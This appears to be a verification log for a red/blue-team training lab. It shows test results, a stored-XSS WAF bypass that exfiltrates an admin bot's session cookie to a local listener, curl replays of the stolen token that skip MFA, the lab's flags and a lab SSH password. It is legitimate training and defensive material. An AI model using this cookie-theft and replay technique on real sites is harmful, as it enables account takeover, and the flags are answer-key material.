# Verification Log — live run

Environment used to validate the lab: Kali Linux host, Docker 28.5.2, Docker
Compose 2.40.3, Node v24 (host) / node:20 (containers). Run against the
repository layout as published (compose file in `docker/`). All results below are
copied from real terminal output — nothing is illustrative.

```
$ docker compose -f docker/docker-compose.yml up -d --build
$ docker compose -f docker/docker-compose.yml exec -T app \
      python3 /usr/src/app/scripts/inject_logs.py --dir /opt/admin/logs --clear
[inject_logs] wrote 11 access events -> /opt/admin/logs/access.log
[inject_logs] wrote 5 error events  -> /opt/admin/logs/error.log

$ bash scripts/verify.sh
== Infrastructure ==
  PASS  GET / returns 200 (200)
  PASS  X-Powered-By exposed (1)
  PASS  robots.txt disallows the MFA path (1)
  PASS  pre_auth cookie issued (1)
== Red Team path ==
  PASS  WAF blocks <script> (403) (403)
  PASS  WAF blocks raw 'document' (403)
  PASS  GET /api/feedback is 405 (405)
  PASS  svg+fetch bypass accepted (200)
  PASS  /dashboard unauth redirects (302)
  PASS  login -> /api/verify-mfa (http://127.0.0.1:3075/api/verify-mfa)
  PASS  /dashboard with valid session (200)
  PASS  final RED flag present (1)
  PASS  forged adm_sess rejected (302)
== Blue Team telemetry ==
  PASS  access: 200 /dashboard @18:51:55 (1)
  PASS  access: attacker IP 10.10.14.50 (6)
  PASS  access: XFF base64 present (2)
  PASS  access: baseline 192.168.1.100 (5)
  PASS  attacker never hit MFA (0)
  PASS  error: WAF <script> @18:50:15 (1)
  PASS  error: anomaly @18:53:10 CRITICAL (1)

== RESULT: 20 passed, 0 failed ==
```

## Manual end-to-end demonstration (Red Team)

The admin bot signed in (MFA included) and began reviewing the dashboard:

```
$ docker logs cyberrange-bot
[bot] signed in, current url = http://feedback:3075/dashboard
[bot] reviewed dashboard (2026-10-08T02:53:06.376Z)
```

The stored-XSS payload was submitted (`<svg onload>` + bracket notation, WAF
bypassed, `HTTP 200`), then executed inside the bot's authenticated browser and
exfiltrated the cookie bundle to the listener:

```
$ python3 exploit/exfil_server.py --port 8899
[+] STOLEN COOKIE: pre_mfa_session=pending_mfa_verification; adm_sess=adm_sess_0d3701a21247809dad74959253796521
```

Replaying the stolen bearer token against `/dashboard` — **no MFA step involved** —
returned `200` and the final flag:

```
$ curl -s --cookie "adm_sess=adm_sess_0d3701a21247809dad74959253796521" \
       http://127.0.0.1:3075/dashboard -o /dev/null -w '%{http_code}\n'
200

$ curl -s --cookie "adm_sess=adm_sess_0d3701a21247809dad74959253796521" \
       http://127.0.0.1:3075/dashboard | grep -oE 'SCENARIO75\{[^}]+\}' | sort -u
SCENARIO75{/dashboard}
SCENARIO75{Node.js}
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
SCENARIO75{adm_sess}
SCENARIO75{xss-payload}
```

## Manual demonstration (Blue Team)

```
$ ssh analyst@<VM-IP> -p 2275        # password: blue_team_rocks
analyst@analyst-box:~$ ls -la /opt/admin/logs
-rw-r--r--    1 root     root          3690 access.log
-rw-r--r--    1 root     root          1002 error.log
analyst@analyst-box:~$ grep '10.10.14.50' /opt/admin/logs/access.log | grep '/api/verify-mfa'
(none)          # the attacker never touched the MFA endpoint
analyst@analyst-box:~$ grep -c CRITICAL /opt/admin/logs/error.log
5
analyst@analyst-box:~$ echo 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | base64 -d
PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
```

Note: `access.log` keeps growing while the lab runs (the bot touches `/dashboard`
every ~20 s). Re-seed with the `inject_logs.py --clear` line above before a demo so
the attacker footprint stands out; the `grep '10.10.14.50'` results are stable
either way.

## Notes discovered while validating

1. **`.app` HSTS preload** — the bot container could not load `http://app:3075`
   (Chromium force-upgrades the `.app` TLD to HTTPS → `net::ERR_SSL_PROTOCOL_ERROR`).
   Fixed by using the `feedback` network alias.
2. **Log-file ownership** — hosting the seeder on the host vs inside the container
   matters; the final `provision.sh` runs it *inside* the app container so the log
   files stay writable by the process that owns them.
3. **Forged tokens** — `adm_sess` is validated against a server-side set, so only
   *replay* of a genuinely issued token works (the intended flaw), not prediction.
4. **Compose file location** — the compose file lives in `docker/`, so it always has
   to be addressed explicitly (`docker compose -f docker/docker-compose.yml …`).
   `scripts/provision.sh` does this for you.
